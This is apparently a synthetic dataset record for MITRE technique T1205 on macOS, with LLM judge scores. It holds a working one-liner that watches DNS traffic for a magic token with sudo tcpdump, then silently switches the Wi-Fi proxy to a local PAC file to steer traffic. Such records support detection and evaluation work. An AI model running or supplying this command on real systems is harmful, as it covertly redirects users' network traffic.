@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "sudo tcpdump -lnni en0 -A 'udp port 53' | grep -m1 'kn0ck.example.com' && networksetup -setautoproxyurl \"Wi-Fi\" http://127.0.0.1/hidden.pac && networksetup -setproxyautodiscovery \"Wi-Fi\" off",
+  "explanation": "Listens for a DNS query containing a magic domain token and, once seen, switches to a local PAC file for traffic steering. Requires sudo for interface capture. Detection: monitor for unauthorized packet sniffing and anomalous PAC URL changes.",
+  "rationale_steps": [
+    "Capture DNS traffic on en0 and search for the magic string 'kn0ck.example.com'.",
+    "Upon detection, set a specific auto-proxy (PAC) URL and disable WPAD.",
+    "Requires sudo to capture packets from the network interface.",
+    "Detect via EDR for tcpdump usage and configuration monitoring for PAC URL modifications."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-d65eb033-216d7b1a",
+  "source_prompt_hash": "d65eb033",
+  "timestamp_utc": "2025-09-30T06:10:08.592373Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed with balanced quotes, valid tcpdump flags, and correct pipe/conditional chaining; minor redundancy (-nn) is harmless.",
+        "semantic_score": 4,
+        "semantic_justification": "Effectively uses a DNS-based trigger to signal and then switch to a local PAC file, aligning with T1205, but proxy changes typically require sudo and depend on the exact network service name.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T14:49:51.211789Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, valid flags for tcpdump (-lnni, -A), proper pipe and && chaining, and correct networksetup subcommand syntax for macOS.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1205 traffic signaling by passively monitoring DNS traffic for a magic domain token and, upon detection, reconfigures the system proxy to a local PAC file — a realistic covert trigger mechanism that aligns precisely with the technique's description of using protocol fields (DNS queries) as signals to coordinate subsequent actions.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T03:49:27.003039Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid shell syntax, balanced quoting, and correct flag usage for tcpdump, grep, and networksetup.",
+        "semantic_score": 5,
+        "semantic_justification": "The command effectively implements traffic signaling by listening for a specific DNS string to trigger a configuration change that redirects network traffic via a PAC file.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T03:49:29.665290Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
